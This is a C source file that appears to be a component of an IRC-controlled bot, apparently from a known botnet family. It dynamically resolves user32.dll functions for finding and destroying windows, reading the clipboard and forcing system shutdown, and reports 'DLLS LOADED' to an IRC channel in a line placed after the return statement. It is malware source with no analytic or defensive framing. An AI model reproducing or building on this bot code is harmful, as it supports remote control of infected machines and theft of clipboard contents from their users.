#include "include.h"
#include "extern.h"

extern SM fSendMessage;
extern CW fCloseWindow;
extern FW fFindWindow;
extern IW fIsWindow;
extern DW fDestroyWindow;
extern OC fOpenClipboard;
extern GCD fGetClipboardData;
extern CC fCloseClipboard;
extern EWE fExitWindowsEx;

CW fCloseWindow;
SM fSendMessage;
FW fFindWindow;
IW fIsWindow;
DW fDestroyWindow;
OC fOpenClipboard;
GCD fGetClipboardData;
CC fCloseClipboard;
EWE fExitWindowsEx;

BOOL nouser32 = FALSE;
DWORD nouser32err = 0;

BOOL LoadDLLs(void) 
{

 	HMODULE user32_dll = LoadLibrary("user32.dll");
    if (user32_dll) {
		fCloseWindow = (CW)GetProcAddress(user32_dll,"CloseWindow");
		fSendMessage = (SM)GetProcAddress(user32_dll,"SendMessageA");
		fFindWindow = (FW)GetProcAddress(user32_dll,"FindWindowA");
		fIsWindow = (IW)GetProcAddress(user32_dll,"IsWindow");
		fDestroyWindow = (DW)GetProcAddress(user32_dll,"DestroyWindow");
		fOpenClipboard = (OC)GetProcAddress(user32_dll,"OpenClipboard");
		fGetClipboardData = (GCD)GetProcAddress(user32_dll,"GetClipboardData");
		fCloseClipboard = (CC)GetProcAddress(user32_dll,"CloseClipboard");
		fExitWindowsEx = (EWE)GetProcAddress(user32_dll,"ExitWindowsEx");

		if (!fCloseWindow || !fSendMessage || !fFindWindow || !fIsWindow || !fDestroyWindow 
			|| !fOpenClipboard || !fGetClipboardData || !fCloseClipboard
			|| !fExitWindowsEx)
	        nouser32 = TRUE;
	}
	return TRUE;
	irc_privmsg("%s DLLS LOADED", channel);
}